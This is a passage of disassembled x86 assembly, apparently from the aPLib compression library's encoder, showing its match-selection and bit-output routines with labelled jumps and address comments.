   jnb aplib@018   ;   0.04024CD
   cmp dword ptr [esp+58h], 00000000
   je aplib@019   ;   0.0401E14
   inc dword ptr [esp+20h]
   test byte ptr [esp+20h], 7Fh
   jne aplib@019
   mov ecx, dword ptr [esp+4Ch]
   mov eax, dword ptr [aplib@004]
   sub eax, ecx
   mov ebx, dword ptr [esp+48h]
   push eax
   mov eax, dword ptr [aplib@003]
   sub eax, ebx
   push eax
   call [esp+60h]
   add esp, 00000008
   test eax, eax
   je aplib@001
   
   aplib@019:
   
   cmp ebp, dword ptr [esp+1Ch]
   jne aplib@020   ;   0.0402031
   mov eax, dword ptr [esp+14h]
   mov dword ptr [esp+04], eax
   mov eax, dword ptr [esp+10h]
   mov dword ptr [esp], eax
   
   aplib@037:
   
   cmp dword ptr [esp+04], 00000002
   jl aplib@021   ;   0.04023E8
   mov eax, dword ptr [esp]
   xor ebx, ebx
   mov edx, dword ptr [aplib@016]
   mov dword ptr [esp+2Ch], ebx
   cmp eax, edx
   je aplib@022   ;   0.040204B
   
   aplib@039:
   
   mov ecx, dword ptr [esp+50h]
   lea eax, dword ptr [ebp+01]
   mov edx, dword ptr [aplib@003]
   mov dword ptr [esp+18h], eax
   inc edx
   mov ebx, eax
   sub ecx, eax
   lea eax, dword ptr [esp+10h]
   call aplib@023   ;   0.040197B
   mov eax, dword ptr [esp+18h]
   mov ecx, dword ptr [esp]
   mov dword ptr [esp+1Ch], eax
   cmp ecx, dword ptr [esp+10h]
   jg aplib@024   ;   0.0402144
   mov edx, dword ptr [esp+04]
   mov eax, ecx
   call aplib@025   ;   0.040140B
   mov edx, dword ptr [esp+14h]
   mov ecx, eax
   mov eax, dword ptr [esp+10h]
   call aplib@025
   mov edx, ecx
   sub edx, eax
   add edx, edx
   mov ecx, 00000009
   mov eax, edx
   sar edx, 1Fh
   idiv ecx
   
   aplib@049:
   
   mov ebx, dword ptr [esp+14h]
   mov edx, dword ptr [esp+04]
   add eax, ebx
   cmp eax, edx
   jle aplib@026   ;   0.0401EC5
   mov dword ptr [esp+2Ch], 00000001
   
   aplib@026:
   
   test esi, esi
   jbe aplib@027   ;   0.0401EF8
   mov eax, dword ptr [esp+14h]
   cmp eax, dword ptr [esp+04]
   jl aplib@027
   mov edx, eax
   mov eax, dword ptr [esp+10h]
   call aplib@025
   mov edx, dword ptr [esp+04]
   mov ecx, eax
   mov eax, dword ptr [esp]
   call aplib@025
   cmp ecx, eax
   jge aplib@027
   mov dword ptr [esp+2Ch], 00000001
   
   aplib@027:
   
   test esi, esi
   jne aplib@028   ;   0.0402174
   mov eax, dword ptr [esp+14h]
   cmp eax, dword ptr [esp+04]
   jnl aplib@028
   mov edx, eax
   mov eax, dword ptr [esp+10h]
   mov ebx, 00000001
   call aplib@025
   mov ecx, eax
   mov edx, ebp
   mov eax, dword ptr [aplib@003]
   call aplib@029   ;   0.0401125
   mov edx, dword ptr [esp+04]
   add ecx, eax
   mov eax, dword ptr [esp]
   call aplib@025
   lea edx, dword ptr [ecx+01]
   cmp edx, eax
   jle aplib@028
   mov dword ptr [esp+2Ch], esi
   
   aplib@050:
   
   cmp dword ptr [esp+04], 00000002
   jle aplib@030   ;   0.0402095
   mov ecx, dword ptr [esp+50h]
   lea eax, dword ptr [esp+08]
   mov edx, dword ptr [aplib@003]
   lea ebx, dword ptr [ebp+02]
   add edx, 00000002
   sub ecx, ebx
   call aplib@023
   mov eax, dword ptr [esp+08]
   cmp eax, dword ptr [esp]
   jl aplib@031   ;   0.0402184
   mov edx, dword ptr [esp+04]
   mov eax, dword ptr [esp]
   call aplib@025
   mov edx, dword ptr [esp+0Ch]
   mov ecx, eax
   mov eax, dword ptr [esp+08]
   call aplib@025
   mov edx, ecx
   sub edx, eax
   mov eax, edx
   sar edx, 1Fh
   shl edx, 02
   sbb eax, edx
   sar eax, 02
   mov edx, dword ptr [esp+0Ch]
   mov ecx, dword ptr [esp+04]
   add eax, edx
   cmp eax, ecx
   
   aplib@051:
   
   jle aplib@032   ;   0.0401FBE
   mov dword ptr [esp+2Ch], 00000001
   
   aplib@032:
   
   test esi, esi
   jbe aplib@033   ;   0.04021C2
   mov eax, dword ptr [esp+0Ch]
   cmp eax, dword ptr [esp+04]
   jl aplib@033
   mov edx, eax
   mov eax, dword ptr [esp+08]
   call aplib@025
   mov edx, dword ptr [esp+04]
   mov ecx, eax
   mov eax, dword ptr [esp]
   call aplib@025
   cmp ecx, eax
   jnl aplib@033
   
   aplib@040:
   
   test esi, esi
   jne aplib@034   ;   0.040200E
   mov eax, dword ptr [esp+04]
   mov dword ptr [esp+28h], eax
   mov eax, dword ptr [esp]
   mov edi, dword ptr [aplib@003]
   mov dword ptr [esp+30h], eax
   
   aplib@034:
   
   mov edx, dword ptr [aplib@003]
   inc edx
   inc esi
   mov dword ptr [aplib@003], edx
   
   aplib@066:
   
   test esi, esi
   jne aplib@035   ;   0.0402406
   
   aplib@069:
   
   inc ebp
   jmp aplib@036   ;   0.0401DD1
   
   aplib@008:
   
   mov ecx, edx
   jmp aplib@002
   
   aplib@020:
   
   mov ecx, dword ptr [esp+50h]
   mov eax, esp
   mov edx, dword ptr [aplib@003]
   mov ebx, ebp
   sub ecx, ebp
   call aplib@023
   jmp aplib@037   ;   0.0401E2D
   
   aplib@022:
   
   cmp esi, 00000001
   jbe aplib@030
   mov eax, dword ptr [esp+30h]
   cmp eax, edx
   je aplib@030
   mov edx, esi
   call aplib@025
   mov ebx, esi
   mov ecx, eax
   mov edx, ebp
   mov eax, edi
   call aplib@029
   cmp ecx, eax
   jge aplib@030
   cmp dword ptr [esp+30h], 00000500h
   jnl aplib@038   ;   0.0402136
   
   aplib@048:
   
   cmp dword ptr [esp+30h], 00007D00h
   jl aplib@039   ;   0.0401E4F
   cmp esi, 00000003
   jne aplib@039
   
   aplib@030:
   
   cmp dword ptr [esp+2Ch], 00000000
   jne aplib@040   ;   0.0401FF5
   test esi, esi
   je aplib@041   ;   0.0402343
   cmp esi, 00000001
   jbe aplib@042   ;   0.0402394
   mov ecx, ebp
   mov eax, dword ptr [esp+50h]
   sub ecx, esi
   sub eax, ecx
   mov ecx, eax
   cmp eax, esi
   jbe aplib@043   ;   0.04020C3
   mov ecx, esi
   
   aplib@043:
   
   lea eax, dword ptr [esp+08]
   mov ebx, ebp
   mov edx, edi
   sub ebx, esi
   call aplib@023
   cmp esi, dword ptr [esp+0Ch]
   ja aplib@044   ;   0.0402104
   mov eax, dword ptr [esp+30h]
   mov edx, esi
   call aplib@025
   mov ecx, eax
   mov edx, esi
   mov eax, dword ptr [esp+08]
   call aplib@025
   cmp ecx, eax
   jle aplib@044
   mov eax, dword ptr [esp+08]
   mov dword ptr [esp+30h], eax
   mov eax, dword ptr [esp+0Ch]
   mov dword ptr [esp+28h], eax
   
   aplib@044:
   
   mov eax, dword ptr [esp+30h]
   mov edx, esi
   call aplib@025
   mov ebx, esi
   mov ecx, eax
   mov edx, ebp
   mov eax, edi
   call aplib@029
   cmp ecx, eax
   jl aplib@045   ;   0.04022BC
   
   aplib@047:
   
   mov edx, ebp
   mov eax, edi
   call aplib@046   ;   0.0401181
   inc edi
   dec esi
   jne aplib@047   ;   0.0402124
   jmp aplib@041
   
   aplib@038:
   
   cmp esi, 00000002
   jne aplib@048   ;   0.040207E
   jmp aplib@030
   
   aplib@024:
   
   mov edx, dword ptr [esp+04]
   mov eax, ecx
   call aplib@025
   mov edx, dword ptr [esp+14h]
   mov ecx, eax
   mov eax, dword ptr [esp+10h]
   call aplib@025
   mov edx, ecx
   sub edx, eax
   mov eax, edx
   sar edx, 1Fh
   shl edx, 02
   sbb eax, edx
   sar eax, 02
   jmp aplib@049   ;   0.0401EAF
   
   aplib@028:
   
   cmp dword ptr [esp+2Ch], 00000000
   je aplib@050   ;   0.0401F49
   jmp aplib@030
   
   aplib@031:
   
   mov edx, dword ptr [esp+04]
   mov eax, dword ptr [esp]
   call aplib@025
   mov edx, dword ptr [esp+0Ch]
   mov ecx, eax
   mov eax, dword ptr [esp+08]
   call aplib@025
   mov edx, ecx
   sub edx, eax
   add edx, edx
   mov ecx, 0000000Bh
   mov eax, edx
   sar edx, 1Fh
   idiv ecx
   mov ecx, dword ptr [esp+0Ch]
   mov ebx, dword ptr [esp+04]
   add eax, ecx
   cmp eax, ebx
   jmp aplib@051   ;   0.0401FB4
   
   aplib@033:
   
   cmp dword ptr [esp+2Ch], 00000000
   jne aplib@030
   cmp dword ptr [esp+04], 00000003
   jle aplib@030
   mov ecx, dword ptr [esp+50h]
   lea eax, dword ptr [esp+08]
   mov edx, dword ptr [aplib@003]
   lea ebx, dword ptr [ebp+03]
   add edx, 00000003
   sub ecx, ebx
   call aplib@023
   mov eax, dword ptr [esp+08]
   cmp eax, dword ptr [esp]
   jl aplib@052   ;   0.040227E
   mov edx, dword ptr [esp+04]
   mov eax, dword ptr [esp]
   call aplib@025
   mov edx, dword ptr [esp+0Ch]
   mov ecx, eax
   mov eax, dword ptr [esp+08]
   call aplib@025
   
   mov edx, ecx
   sub edx, eax
   mov eax, edx
   sar edx, 1Fh
   shl edx, 02
   sbb eax, edx
   sar eax, 02
   mov edx, dword ptr [esp+0Ch]
   mov ecx, dword ptr [esp+04]
   add eax, edx
   cmp eax, ecx
   
   aplib@054:
   
   jle aplib@053   ;   0.0402242
   mov dword ptr [esp+2Ch], 00000001
   
   aplib@053:
   
   test esi, esi
   jbe aplib@030
   mov eax, dword ptr [esp+0Ch]
   cmp eax, dword ptr [esp+04]
   jl aplib@030
   mov edx, eax
   mov eax, dword ptr [esp+08]
   call aplib@025
   mov edx, dword ptr [esp+04]
   mov ecx, eax
   mov eax, dword ptr [esp]
   call aplib@025
   cmp ecx, eax
   jnl aplib@030
   jmp aplib@040
   
   aplib@052:
   
   mov edx, dword ptr [esp+04]
   mov eax, dword ptr [esp]
   call aplib@025
   mov edx, dword ptr [esp+0Ch]
   mov ecx, eax
   mov eax, dword ptr [esp+08]
   call aplib@025
   mov edx, ecx
   sub edx, eax
   add edx, edx
   mov ecx, 0000000Bh
   mov eax, edx
   sar edx, 1Fh
   idiv ecx
   mov ecx, dword ptr [esp+0Ch]
   mov ebx, dword ptr [esp+04]
   add eax, ecx
   cmp eax, ebx
   jmp aplib@054   ;   0.0402238
   
   aplib@045:
   
   mov eax, dword ptr [esp]
   cmp eax, dword ptr [aplib@016]
   jne aplib@055   ;   0.0402307
   mov ebx, esi
   mov edx, ebp
   mov eax, edi
   call aplib@029
   mov edx, dword ptr [esp+04]
   mov ecx, eax
   mov eax, dword ptr [esp]
   call aplib@025
   mov edx, esi
   lea ebx, dword ptr [ecx+eax]
   mov eax, dword ptr [esp+30h]
   call aplib@025
   mov ecx, eax
   mov eax, dword ptr [esp]
   mov edx, dword ptr [esp+04]
   inc eax
   call aplib@025
   add eax, ecx
   cmp ebx, eax
   jle aplib@047
   
   aplib@055:
   
   mov eax, dword ptr [esp+30h]
   cmp eax, dword ptr [aplib@016]
   je aplib@056   ;   0.0402336
   cmp eax, 00000500h
   jl aplib@057   ;   0.0402323
   cmp esi, 00000002
   je aplib@047
   
   aplib@057:
   
   cmp dword ptr [esp+30h], 00007D00h
   jl aplib@056
   cmp esi, 00000003
   je aplib@047
   
   aplib@056:
   
   mov eax, dword ptr [esp+30h]
   mov edx, esi
   call aplib@058   ;   0.0401689
   
   aplib@063:
   
   xor esi, esi
   
   aplib@041:
   
   mov eax, dword ptr [esp+04]
   cmp eax, 00000003
   jg aplib@059   ;   0.04023C1
   mov edx, eax
   mov eax, dword ptr [esp]
   call aplib@025
   mov ebx, dword ptr [esp+04]
   mov ecx, eax
   mov edx, ebp
   mov eax, dword ptr [aplib@003]
   call aplib@029
   cmp ecx, eax
   jle aplib@060   ;   0.040239F
   
   aplib@065:
   
   mov ecx, dword ptr [esp+04]
   
   aplib@062:
   
   test ecx, ecx
   je aplib@061   ;   0.04023DE
   mov eax, dword ptr [aplib@003]
   mov edx, ebp
   call aplib@046
   mov ebx, dword ptr [aplib@003]
   inc ebx
   dec ecx
   mov dword ptr [aplib@003], ebx
   jmp aplib@062   ;   0.0402374
   
   aplib@042:
   
   mov edx, ebp
   mov eax, edi
   call aplib@046
   jmp aplib@063   ;   0.0402341
   
   aplib@060:
   
   mov eax, dword ptr [esp]
   cmp eax, dword ptr [aplib@016]
   je aplib@059
   cmp eax, 00000500h
   jl aplib@064   ;   0.04023B8
   cmp dword ptr [esp+04], 00000002
   je aplib@065   ;   0.0402370
   
   aplib@064:
   
   cmp dword ptr [esp], 00007D00h
   jge aplib@065
   
   aplib@059:
   
   mov edx, dword ptr [esp+04]
   mov eax, dword ptr [esp]
   call aplib@058
   mov edx, dword ptr [esp+04]
   mov eax, dword ptr [aplib@003]
   add edx, eax
   mov dword ptr [aplib@003], edx
   
   aplib@061:
   
   add ebp, dword ptr [esp+04]
   dec ebp
   jmp aplib@066   ;   0.040201C
   
   aplib@021:
   
   test esi, esi
   je aplib@067   ;   0.04023F8
   inc esi
   
   aplib@068:
   
   inc dword ptr [aplib@003]
   jmp aplib@066
   
   aplib@067:
   
   mov eax, dword ptr [aplib@003]
   mov edx, ebp
   call aplib@046
   jmp aplib@068   ;   0.04023ED
   
   aplib@035:
   
   mov eax, dword ptr [esp+28h]
   cmp esi, eax
   jne aplib@069   ;   0.0402024
   mov ecx, ebp
   sub ecx, eax
   mov eax, dword ptr [esp+50h]
   sub eax, ecx
   mov ecx, eax
   cmp eax, esi
   jbe aplib@070   ;   0.0402424
   mov ecx, esi
   
   aplib@070:
   
   lea eax, dword ptr [esp+08]
   mov ebx, ebp
   mov edx, edi
   sub ebx, esi
   call aplib@023
   cmp esi, dword ptr [esp+0Ch]
   ja aplib@071   ;   0.0402465
   mov eax, dword ptr [esp+30h]
   mov edx, esi
   call aplib@025
   mov ecx, eax
   mov edx, esi
   mov eax, dword ptr [esp+08]
   call aplib@025
   cmp ecx, eax
   jle aplib@071
   mov eax, dword ptr [esp+08]
   mov dword ptr [esp+30h], eax
   mov eax, dword ptr [esp+0Ch]
   mov dword ptr [esp+28h], eax
   
   aplib@071:
   
   mov eax, dword ptr [esp+30h]
   mov edx, esi
   call aplib@025
   mov ebx, esi
   mov ecx, eax
   mov edx, ebp
   mov eax, edi
   call aplib@029
   cmp ecx, eax
   jl aplib@072   ;   0.0402494
   
   aplib@073:
   
   mov edx, ebp
   mov eax, edi
   call aplib@046
   inc edi
   dec esi
   je aplib@069
   jmp aplib@073   ;   0.0402481
   
   aplib@072:
   
   mov eax, dword ptr [esp+30h]
   cmp eax, dword ptr [aplib@016]
   je aplib@074   ;   0.04024BB
   cmp eax, 00000500h
   jl aplib@075   ;   0.04024AC
   cmp esi, 00000002
   je aplib@073
   
   aplib@075:
   
   cmp dword ptr [esp+30h], 00007D00h
   jl aplib@074
   cmp esi, 00000003
   je aplib@073
   
   aplib@074:
   
   mov eax, dword ptr [esp+30h]
   mov edx, esi
   call aplib@058
   xor esi, esi
   jmp aplib@069
   
   aplib@018:
   
   test esi, esi
   je aplib@076   ;   0.040253F
   cmp esi, 00000001
   jbe aplib@077   ;   0.0402562
   mov eax, dword ptr [esp+30h]
   mov edx, esi
   call aplib@025
   mov ebx, esi
   mov ecx, eax
   mov edx, ebp
   mov eax, edi
   call aplib@029
   cmp ecx, eax
   jle aplib@078   ;   0.040250D
   
   aplib@082:
   
   xor ebx, ebx
   
   aplib@079:
   
   cmp ebx, esi
   jnb aplib@076
   mov edx, ebp
   mov eax, edi
   call aplib@046
   inc ebx
   inc edi
   jmp aplib@079   ;   0.04024FC
   
   aplib@078:
   
   mov eax, dword ptr [esp+30h]
   cmp eax, dword ptr [aplib@016]
   je aplib@080   ;   0.0402534
   cmp eax, 00000500h
   jl aplib@081   ;   0.0402525
   cmp esi, 00000002
   je aplib@082   ;   0.04024FA
   
   aplib@081:
   
   cmp dword ptr [esp+30h], 00007D00h
   jl aplib@080
   cmp esi, 00000003
   je aplib@082
   
   aplib@080:
   
   mov eax, dword ptr [esp+30h]
   mov edx, esi
   call aplib@058
   
   aplib@076:
   
   cmp dword ptr [esp+24h], 00000000
   je aplib@083   ;   0.040256D
   
   aplib@089:
   
   cmp dword ptr [esp+58h], 00000000
   jne aplib@084   ;   0.0402649
   
   aplib@093:
   
   mov ebx, dword ptr [esp+4Ch]
   mov ecx, dword ptr [aplib@004]
   sub ecx, ebx
   jmp aplib@002
   
   aplib@077:
   
   mov edx, ebp
   mov eax, edi
   call aplib@046
   jmp aplib@076
   
   aplib@083:
   
   mov ebx, dword ptr [aplib@015]
   dec ebx
   mov dword ptr [aplib@015], ebx
   cmp ebx, 0FFFFFFFFh
   je aplib@085   ;   0.04025E9
   
   aplib@090:
   
   mov eax, dword ptr [aplib@086]   ;   0.0403518
   mov dl, byte ptr [eax]
   mov ebp, dword ptr [aplib@015]
   add dl, dl
   dec ebp
   inc dl
   mov dword ptr [aplib@015], ebp
   mov byte ptr [eax], dl
   cmp ebp, 0FFFFFFFFh
   je aplib@087   ;   0.0402609
   
   aplib@091:
   
   mov eax, dword ptr [aplib@086]
   mov dl, byte ptr [eax]
   mov ecx, dword ptr [aplib@015]
   add dl, dl
   dec ecx
   inc dl
   mov dword ptr [aplib@015], ecx
   mov byte ptr [eax], dl
   cmp ecx, 0FFFFFFFFh
   je aplib@088   ;   0.0402629
   
   aplib@092:
   
   mov eax, dword ptr [aplib@086]
   mov dl, byte ptr [eax]
   add dl, dl
   mov byte ptr [eax], dl
   mov edx, dword ptr [aplib@004]
   mov byte ptr [edx], 00
   mov cl, byte ptr [aplib@015]
   mov bl, byte ptr [eax]
   inc edx
   shl bl, cl
   mov dword ptr [aplib@004], edx
   mov byte ptr [eax], bl
   jmp aplib@089   ;   0.0402546
   
   aplib@085:
   
   mov eax, dword ptr [aplib@004]
   mov edi, 00000007
   mov dword ptr [aplib@086], eax
   inc eax
   mov dword ptr [aplib@015], edi
   mov dword ptr [aplib@004], eax
   jmp aplib@090   ;   0.040257F
   
   aplib@087:
   
   mov eax, dword ptr [aplib@004]
   mov edx, 00000007
   mov dword ptr [aplib@086], eax
   inc eax
   mov dword ptr [aplib@015], edx
   mov dword ptr [aplib@004], eax
   jmp aplib@091   ;   0.040259E
   
   aplib@088:
   
   mov eax, dword ptr [aplib@004]
   mov esi, 00000007
   mov dword ptr [aplib@086], eax
   inc eax
   mov dword ptr [aplib@015], esi
   mov dword ptr [aplib@004], eax
   jmp aplib@092   ;   0.04025BD
   
   aplib@084:
   
   mov ebp, dword ptr [esp+4Ch]
   mov eax, dword ptr [aplib@004]
   sub eax, ebp
   mov edx, dword ptr [esp+48h]
   push eax
   mov eax, dword ptr [aplib@003]
   sub eax, edx
   push eax
   call [esp+60h]
   add esp, 00000008
   test eax, eax
   jne aplib@093   ;   0.0402551
   
   aplib@001:
   
   xor ecx, ecx
   
   aplib@002:
   
   mov eax, ecx
   add esp, 34h
   pop ebp
   pop edi
   pop esi
   pop ebx
   ret 0014h
